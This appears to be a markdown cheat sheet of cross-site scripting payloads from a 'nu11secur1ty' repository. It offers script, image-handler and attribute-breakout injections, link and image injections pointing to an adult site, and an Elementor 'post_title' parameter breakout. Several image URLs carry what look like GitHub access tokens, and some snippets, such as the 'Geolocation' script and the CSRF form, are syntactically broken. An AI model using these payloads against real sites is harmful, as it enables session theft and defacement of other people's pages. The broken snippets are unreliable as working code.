## DOM & STORED
```
<script>alert(document.cookie)</script>
<script>alert('document.cookie')</script>
<script>alert("document.cookie")</script>
<script>alert(document.domain)</script>
qnlxv"><script>alert('hello from nu11secur1ty')</script>sad4r
```
## Self Cross-Site Scripting 
```mysql
<img src="" onerror="alert(document.cookie)">
```
## Non ExistantImage
```
<div><image src=validateNonExistantImage.png onloadstart=alert(1337)>hello from nu11secur1ty</div>
```
## ExistantImage
```
<div><image src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp onloadstart=alert(1337)>hello from nu11secur1ty</div>
```
## Get cookie
```
nu11secur1ty<script>alert(document.cookie)</script>
```
## Alert check
```
<script>alert("Hello");</script>
<script>alert("nu11secur1ty_is_here");</script>
```

## Hidden Image
```
<script>function a() { document.write("<img src='https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp?token=GHSAT0AAAAAABTHSDC76YMVBQKZ7VLVFSBAYTHWGMQ'></img>"); }; window.onload = a; alert("A Hidden scripted image, warning you are vulnerable!");</script>
```
## Post image
```
<form action="#" method="post"><label for="imgURL">image URL:</label><input type="url" id="imgURL"/><label for="pageURL">page URL:</label><input type="url" id="pageURL"/><button id="imgAdd">add image</button></form>
```
- 0.1
```
</span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif <a href=https://pornhub.com/> onerror=alert(1) /></span>
```

- 0.4
```
</span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>welcome<a href=https://pornhub.com/>
```

- 0.5 - Stupid Reflected
```
<a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
<img src="https://th.bing.com/th/id/OIP.oiIYrhY78i7grK52ZoHsJAHaEH?pid=ImgDet&rs=1" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
</a>
```

- 0.5.1 - Stupid Reflected
```
<a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
<img src="https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/IMG_0068.gif?token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
</a>
```

- 0.5.3 - Stupid Reflected
```
<a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
<img src="https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
</a>
```


- 1.4.0 - size 10%, Stupid Reflected
```
<a href="https://pornhub.com/" target="_blank" rel="noopener nofollow ugc">
<img src="https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1" style="border:1px solid black;max-width:10%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
</a>
```


## without error report + link to malicious URL

```js
<span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>link<a href=http://example.com/></span>
<img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif>
<a href="https://www.nu11secur1ty.com/"><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif" width=150" height="70">
<a href="https://www.nu11secur1ty.com/"><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif">
```
## Error check
```
</span><img src=1 onerror=alert(1) /><span>
```
## CSFR tokens
```
<form action="https:/yourdomain.com/acquire_token.php"></textarea>
```
## Geolocation
```
<script>Var today = new Date().toLocaleString() + 'week' + 'day one two three four five six'.charAt(new Date().getDay());document.getElementById('remote').src = "htttp:// + today + "----" + encodeURIComponent(position.coords.latitude) + "," + encodeURIComponent(position.coords.longitude</script>
```
## "post_title" parameter
```
<input class="elementor-field elementor-field-textual elementor-size-lg" type="text" placeholder="" value="\"><script>alert(document.cookie)</script><\"" name="post_title" id="dce_view_f9fc119_post_title">
```
## Document_cookie
```
<input class="elementor-field elementor-field-textual elementor-size-lg" type="text" placeholder="" value="\"><script>alert(document.cookie)</script><\"" name="post_title" id="dce_view_f9fc119_post_title">
```
